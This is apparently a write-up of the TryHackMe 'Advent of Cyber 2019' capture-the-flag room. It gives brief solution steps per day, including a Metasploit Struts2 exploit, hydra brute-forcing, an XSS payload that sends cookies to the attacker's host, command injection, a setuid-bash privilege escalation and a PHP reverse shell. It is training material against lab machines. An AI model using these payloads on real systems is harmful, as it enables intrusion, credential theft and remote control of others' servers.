# Advent of Cyber 2019

**Room link:** https://tryhackme.com/room/25daysofchristmas

These are mostly easy challenges, we usually only provide a general idea of the process to follow.

## Day 1

The cookie is URL-encoded base64.

## Day 2

A comment on the hidden page leads some default credentials.

## Day 3

Used `john` & `rockyou.txt` for the shadow.

## Day 4

There exists an unprotected backup of the `/etc/shadow` file...

## Day 5

Don't forget the [wayback machine](https://archive.org/web/)...

## Day 6

The DNS-exfiltrated data simply is hex-encoded.

Used `zip2john` & `john` & `rockyou.txt` for the ZIP.

Used `steghide` with empty passphrase for the JPEG.

## Day 7

_Basic `nmap -A`._

## Day 8

The port is 65534...

`find` is the first key (another option was `nmap` but it does not work here, it actually drops the privileges when running a script), `system-control` the second one.

## Day 9

```python
import requests

URL = 'http://10.10.***.***:3000/'

values = []
subdir = ''
while subdir != 'end':
    req = requests.get(URL + subdir)
    ans = req.json()
    values.append(ans['value'])
    subdir = ans['next']
values.pop()  # 'end'
print(''.join(values))
```

## Day 10

1. Straightforward Metasploit [exploit](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/struts2_content_type_ognl.md):

```
$ msfconsole
msf6 > search struts2
msf6 > use 1
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/http/struts2_content_type_ognl) > set RHOSTS 10.10.***.**
msf6 exploit(multi/http/struts2_content_type_ognl) > set RPORT 80
msf6 exploit(multi/http/struts2_content_type_ognl) > set TARGETURI /showcase.action
msf6 exploit(multi/http/struts2_content_type_ognl) > set LHOST 10.9.***.***
msf6 exploit(multi/http/struts2_content_type_ognl) > check
[+] 10.10.***.**:80 - The target is vulnerable.
msf6 exploit(multi/http/struts2_content_type_ognl) > exploit
meterpreter > shell
id
uid=0(root) gid=0(root) groups=0(root)
find / -name '*Flag*' -type f 2>/dev/null
/usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
cat /usr/local/tomcat/webapps/ROOT/ThisIsFlag1.txt
**REDACTED**
cat /home/santa/ssh-creds.txt
santa:**REDACTED**
```

2. Log in as `santa` through SSH (otherwise the lists do not appear).

```
$ ssh santa@$TARGET_IP
[santa@ip-10-10-***-** ~]$ cat -n naughty_list.txt | grep 148
   148  **REDACTED**
[santa@ip-10-10-***-** ~]$ cat nice_list.txt | tail -n+52 | head -1
**REDACTED**
```

## Day 11

1. `nmap` reveals FTP, SSH (useless here), NFS and MySQL services on standard ports.

2. NFS

```
$ showmount --exports $TARGET_IP
Export list for 10.10.***.**:
/opt/files *
$ mkdir /tmp/mynfs
$ sudo mount -t nfs $TARGET_IP:/opt/files /tmp/mynfs
$ cat /tmp/mynfs/creds.txt
**REDACTED**
```

3. FTP allows `anonymous` login and contains the credentials to access MySQL.

4. MySQL

```
$ mysql -u root -p -h $TARGET_IP
...
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| data               |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
...
mysql> use data;
...
Database changed
mysql> show tables;
+----------------+
| Tables_in_data |
+----------------+
| USERS          |
+----------------+
...
mysql> select * from USERS;
+-------+--------------+
| name  | password     |
+-------+--------------+
| admin | **REDACTED** |
+-------+--------------+
```

## Day 12

We are given:
 - the GPG (AES) key `25daysofchristmas`;
 - the RSA private key passphrase `hello`.

```
$ gpg -d note1.txt.gpg
gpg: données chiffrées avec AES
gpg: chiffré avec 1 phrase secrète
**REDACTED**
$ openssl rsautl -decrypt -inkey private.key -in note2_encrypted.txt 
Enter pass phrase for private.key:
**REDACTED**
```

## Day 13 - TODO

## Day 14

_As you need to create an AWS account for this one, I looked for a [write-up](https://medium.com/@ratiros01/tryhackme-advent-of-cyber-3b64a0fe8199) instead._

## Day 15

Call `getNote('/etc/shadow', '#note-1')` in a JS console (then use `john` & `rockyou.txt`).

## Day 16

Python code to extract EXIF data using `exiftool`:

```python
import subprocess

def exiftool(fname):
    proc = subprocess.run(('exiftool', fname), capture_output=True)
    metadata = {}
    for line in proc.stdout.decode().rstrip('\n').split('\n'):
        i = line.index(':')
        field, value = line[:i].rstrip(), line[i+2:]
        metadata[field] = value
    return metadata
```

Python code to extract strings from a binary (similar to the `strings` command):

```python
def strings_in_binary(fname):
    printable = lambda c: 32 <= c < 127
    F = open(fname, 'rb')
    curr = []
    eof = False
    while not eof:
        c = F.read(1)
        if c:
            c = c[0]
        else:
            c = 0
            eof = True
        if printable(c):
            curr.append(chr(c))
        else:
            string = ''.join(curr).strip()
            if string:
                yield string
            curr.clear()
```

Python script to solve the challenge (to run in a fresh directory where the original archive was unzipped):

```python
import os, zipfile

cnt = cnt_v11 = 0
for zname in os.listdir():
    if zname.endswith('.zip'):
        Z = zipfile.ZipFile(zname)
        for fname in Z.namelist():
            cnt += 1
            Z.extract(fname)
            meta = exiftool(fname)
            if meta.get('Version', None) == '1.1':
                cnt_v11 += 1
            for s in strings_in_binary(fname):
                if 'password' in s:
                    print(fname, s)
print(f'{cnt} files')
print(f'{cnt_v11} files with Version: 1.1')
```

## Day 17

```
$ hydra -l molly -P rockyou.txt $TARGET_IP http-post-form '/login:username=^USER^&password=^PASS^:incorrect'
...
[80][http-post-form] host: 10.10.**.***   login: molly   password: **REDACTED**
...
$ hydra -l molly -P rockyou.txt $TARGET_IP ssh       
...
[22][ssh] host: 10.10.**.***   login: molly   password: **REDACTED**
```

## Day 18

We post the following [XSS payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#data-grabber-for-xss) in a comment.

```html
<script>new Image().src="http://10.9.***.***:4444/?stolen="+document.cookie;</script>
```

And wait for the incoming request.

```
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.**.*** 42376
GET /?stolen=authid=**REDACTED** HTTP/1.1
Host: 10.9.***.***:4444
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3844.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://localhost:3000/admin
Accept-Encoding: gzip, deflate
```

## Day 19

Simply append any URL-encoded shell command to `/api/cmd/`.

```
$ curl "http://$TARGET_IP:3000/api/cmd/cat%20%2Fhome%2Fbestadmin%2Fuser%2Etxt"
```

## Day 20

1. Brute-force into.

```
$ hydra -l sam -P rockyou.txt -s 4567 $TARGET_IP ssh
```

2. Replace the content of `/home/scripts/clean_up.sh` with:

```
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Wait a minute.

```
sam@ip-10-10-**-**:/home/scripts$ /tmp/rootbash -p
rootbash-4.3# cat /home/ubuntu/flag2.txt 
**REDACTED**
```

## Days 21 & 22

_Very basic introduction to `radare2`._

## Day 23

1. SQLi

```
$ sqlmap --data="log_email=1&log_password=2&login_button=Login" -u "http://$TARGET_IP/register.php" --dbms=MySQL -p log_email --dump
```

We identify Santa's email `bigman@shefesh.com` and [crack](https://crackstation.net/) his password hash.

2. Log in and post a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell) using a `.phtml` extension as the attachment to a comment.

```
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.***.*** 55982
Linux server 4.15.0-72-generic #81-Ubuntu SMP Tue Nov 26 12:20:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 17:31:12 up  1:30,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cat /home/user/flag.txt
**REDACTED**
```

## Day 24 - TODO
